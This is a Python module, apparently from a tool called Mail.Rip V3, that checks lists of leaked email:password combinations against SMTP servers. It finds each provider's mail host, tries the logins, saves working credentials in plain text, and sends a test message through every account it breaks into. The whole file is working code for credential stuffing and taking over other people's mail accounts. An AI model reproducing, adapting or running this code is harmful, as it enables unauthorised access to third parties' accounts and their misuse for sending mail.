#!/usr/local/opt/python@3.8/bin/python3
# -*- coding: utf-8 -*-

__author__ = 'DrPython3'
__date__ = '2021-12-04'
__version__ = 'BETA(1)'
__contact__ = 'https://github.com/DrPython3'

'''
---------------------------------------------
Functions for Checking Mailpass Combos (SMTP)
---------------------------------------------

Part of << Mail.Rip V3: https://github.com/DrPython3/MailRipV3 >>
'''

# [IMPORTS]
# ---------

import sys
import json
import ssl
import smtplib
from inc_testmail import mailer
from inc_etc import result
from inc_mxlookup import get_host

# [FUNCTIONS]
# -----------

def smtpchecker(default_timeout, default_email, target):
    '''
    Main checker function (SMTP) including testmail sending in case a valid login is found.

    :param float default_timeout: connection timeout set by user
    :param str default_email: user email for sending testmail
    :param str target: emailpass combo to check
    :return: True (valid login), False (login not valid)
    '''
    # start the checking:
    try:
        # variables and stuff:
        sslcontext = ssl.create_default_context()
        output_hits = str('smtp_valid')
        output_checked = str('smtp_checked')
        output_testmail = str('smtp_testmessages')
        target_email = str('')
        target_user = str('')
        target_password = str('')
        target_host = str('')
        target_port = int(0)
        service_info = str('')
        service_found = False
        connection_ok = False
        checker_result = False
        email_sent = False
        try:
            # load lists and dictionaries from json-files:
            with open('inc_smtpdomains.json') as inc_smtpdomains:
                load_domains = json.load(inc_smtpdomains)
                smtp_domains = (load_domains['smtpdomains'])
            with open('inc_smtpports.json') as inc_smtpports:
                load_ports = json.load(inc_smtpports)
                smtp_ports = (load_ports['smtpports'])
            with open('inc_smtpservices.json') as inc_smtpservices:
                load_services = json.load(inc_smtpservices)
                smtp_services = (load_services['smtpservices'])
        except:
            # on errors set empty lists and dictionary:
            smtp_domains = []
            smtp_ports = []
            smtp_services = {}
        # prepare target information:
        new_target = str(str(target).replace('\n', ''))
        target_email, target_password = new_target.split(':')
        target_user = str(target_email)
        # try to get host and port from dictionary:
        try:
            service_info = str(smtp_services[str(target_email.split('@')[1])])
            target_host = str(service_info.split(':')[0])
            target_port = int(service_info.split(':')[1])
            # declare service details found:
            service_found = True
        except:
            pass
        # establish connection with any found service details:
        if service_found == True:
            try:
                # SSL-connection:
                if int(target_port) == int(465):
                    smtp_connection = smtplib.SMTP_SSL(
                        host=str(target_host),
                        port=int(target_port),
                        timeout=default_timeout,
                        context=sslcontext
                    )
                    smtp_connection.ehlo()
                    # declare connection established:
                    connection_ok = True
                # regular connection:
                else:
                    smtp_connection = smtplib.SMTP(
                        host=str(target_host),
                        port=int(target_port),
                        timeout=default_timeout
                    )
                    smtp_connection.ehlo()
                    # TLS:
                    try:
                        smtp_connection.starttls(
                            context=sslcontext
                        )
                        smtp_connection.ehlo()
                    except:
                        pass
                    # declare connection established:
                    connection_ok = True
            except:
                pass
        # if connection failed or no service details found, try to find host:
        if service_found == False or connection_ok == False:
            try:
                # try to get from MX records:
                mx_result, found_host = get_host(default_timeout, target_email)
            except:
                mx_result = False
                found_host = str('')
            # if host found using MX records:
            if mx_result == True:
                target_host = str(found_host)
                # get port:
                for next_port in smtp_ports:
                    # SSL-connection:
                    try:
                        if int(next_port) == int(465):
                            smtp_connection = smtplib.SMTP_SSL(
                                host=str(target_host),
                                port=int(next_port),
                                timeout=default_timeout,
                                context=sslcontext
                            )
                            smtp_connection.ehlo()
                            # change variables for established connections:
                            target_port = int(next_port)
                            connection_ok = True
                        else:
                            # regular connection:
                            smtp_connection = smtplib.SMTP(
                                host=str(target_host),
                                port=int(next_port),
                                timeout=default_timeout
                            )
                            smtp_connection.ehlo()
                            # TLS:
                            try:
                                smtp_connection.starttls(
                                    context=sslcontext
                                )
                                smtp_connection.ehlo()
                            except:
                                pass
                            # change variables for established connections:
                            target_port = int(next_port)
                            connection_ok = True
                        break
                    except:
                        continue
            # if MX-lookup fails, try to connect using common values:
            if connection_ok == False:
                for subdomain in smtp_domains:
                    test_host = str(str(subdomain) + str(target_email.split('@')[1]))
                    for next_port in smtp_ports:
                        # try to establish connection to generated host:
                        try:
                            # SSL-connection:
                            if int(next_port) == int(465):
                                smtp_connection = smtplib.SMTP_SSL(
                                    host=str(test_host),
                                    port=int(next_port),
                                    timeout=default_timeout,
                                    context=sslcontext
                                )
                                smtp_connection.ehlo()
                                # change variables for established connections:
                                target_host = str(test_host)
                                target_port = int(next_port)
                                connection_ok = True
                            else:
                                # regular connection:
                                smtp_connection = smtplib.SMTP(
                                    host=str(test_host),
                                    port=int(next_port),
                                    timeout=default_timeout
                                )
                                smtp_connection.ehlo()
                                # TLS:
                                try:
                                    smtp_connection.starttls(
                                        context=sslcontext
                                    )
                                    smtp_connection.ehlo()
                                except:
                                    pass
                                # change variables for established connections:
                                target_host = str(test_host)
                                target_port = int(next_port)
                                connection_ok = True
                            break
                        except:
                            continue
                    if connection_ok == True:
                        break
                    else:
                        continue
        # with connection established, check login details:
        if connection_ok == True:
            try:
                try:
                    # user = email:
                    smtp_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    # declare login valid:
                    checker_result = True
                except:
                    # user = userid from email:
                    target_user = str(target_email.split('@')[0])
                    smtp_connection.login(
                        user=str(target_user),
                        password=str(target_password)
                    )
                    # declare login valid:
                    checker_result = True
                try:
                    smtp_connection.quit()
                except:
                    pass
                # write logs:
                result_output = str(f'email={str(target_email)}, host={str(target_host)}:{str(target_port)}, login={str(target_user)}:{str(target_password)}')
                result(output_hits, result_output)
                result(output_checked, str(f'{new_target};result=login valid'))
                # show found login on screen:
                print(f'[VALID]    {result_output}')
            except:
                result(output_checked, str(f'{new_target};result=login failed'))
        # no connection established, write log:
        else:
            result(output_checked, str(f'{new_target};result=no connection'))
        # with valid login, try to send testmail:
        if checker_result == True:
            try:
                email_sent = mailer(
                    str(default_email),
                    str(target_email),
                    str(target_host),
                    int(target_port),
                    str(target_user),
                    str(target_password)
                )
                # write log for testmail:
                if email_sent == True:
                    result(output_testmail, str(f'{new_target};result=testmessage sent'))
                else:
                    result(output_testmail, str(f'{new_target};result=testmessage not sent'))
            # if testmail fails, write log:
            except:
                result(output_testmail, str(f'{new_target};result=testmessage failed'))
            return True
        else:
            return False
    # on any errors while checking, write log before exit:
    except:
        result(output_checked, str(f'{new_target};result=check failed'))
        return False

# DrPython3 (C) 2021 @ GitHub.com
